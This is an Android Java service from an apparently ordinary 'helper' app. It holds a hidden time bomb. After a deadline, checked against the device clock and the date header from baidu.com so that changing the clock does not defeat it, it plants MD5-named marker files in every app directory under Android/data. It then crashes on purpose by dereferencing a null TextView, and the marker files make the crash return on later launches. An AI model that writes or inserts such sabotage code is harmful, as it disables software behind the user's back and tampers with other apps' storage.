package com.leoman.helper.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.TextView;

import com.leoman.helper.util.DataUtil;
import com.leoman.helper.util.Md5Util;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;
import java.util.Random;

public class FileService extends Service {

    private boolean isEnd;
    private String endtime;
    private String[] fileNames = {"马刺", "雷霆", "nba", "勇士", "总冠军"};

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        endtime = intent.getExtras().getString("time");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                while (!isEnd) {
                    getFile();
                    getStatus();
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        t.start();
    }

    private void setFiles()  //搜索目录，扩展名，是否进入子文件夹
    {
        File[] files = new File("/storage/emulated/0/Android/data/").listFiles();
        for (int i = 0; i < files.length; i++) {
            String docPath = files[i].getAbsolutePath();
            File f = files[i];
            if (f.isDirectory()) {
                File folder = new File(docPath, getName());
                try {
                    folder.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        edit();
    }

    private void getFile() {
        File[] files = new File("/storage/emulated/0/Android/data/").listFiles();
        for (int i = 0; i < files.length; i++) {
            File f = files[i];
            if (f.isDirectory()) {
                File[] files2 = f.listFiles();
                for (int j = 0; j < files2.length; j++) {
                    File f2 = files2[j];
                    String fileName = f2.getAbsolutePath();
                    for (int k = 0; k < fileNames.length; k++) {
                        String Extension = Md5Util.encodeByMD5(fileNames[k]);
                        if (fileName.substring(fileName.length() - Extension.length()).equals(Extension)) {
                            edit();
                            return;
                        }
                    }
                }

            }
        }
    }

    private String getName() {
        Random random = new Random();
        int num = random.nextInt(5);
        return Md5Util.encodeByMD5(fileNames[num]);
    }

    private void getStatus() {
        final long endDate = DataUtil.time2LongTimeStamp(endtime);
        final long currenttimemillis = System.currentTimeMillis();

        if (currenttimemillis >= endDate)
            setFiles();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL("http://www.baidu.com");
                    URLConnection uc = url.openConnection();//生成连接对象
                    uc.connect(); //发出连接
                    long ld = uc.getDate(); //取得网站日期时间
                    Date date = new Date(ld); //转换为标准时间对象
                    long httpTimemillis = date.getTime();
                    if (httpTimemillis >= endDate)
                        setFiles();
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }).start();

    }

    private void edit() {
        isEnd = true;
        TextView textView = null;
        textView.setText("");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isEnd = true;
    }
}
